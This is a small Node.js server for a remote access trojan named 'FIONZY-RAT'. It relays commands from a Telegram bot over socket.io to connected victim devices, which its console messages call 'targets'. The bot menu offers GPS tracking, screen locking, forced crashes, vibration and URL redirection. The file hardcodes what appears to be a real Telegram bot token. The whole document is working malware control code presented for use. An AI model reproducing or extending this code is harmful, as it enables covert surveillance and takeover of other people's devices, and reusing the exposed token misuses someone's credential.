const { Telegraf } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const bot = new Telegraf('8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'); // Ganti Token

io.on('connection', (socket) => {
    console.log('⚡ Target Terkoneksi!');
    bot.on('text', (ctx) => {
        const msg = ctx.message.text;
        io.emit('command', msg);
        if(msg === '/menu') ctx.reply("⚡ **FIONZY-RAT**\n/info | /gps | /vibrate\n/lock | /unlock | /crash\n/redirect [url]");
    });
});

server.listen(3000, '0.0.0.0', () => { console.log('⚡ Server Fionzy Aktif di Port 3000'); });
bot.launch();
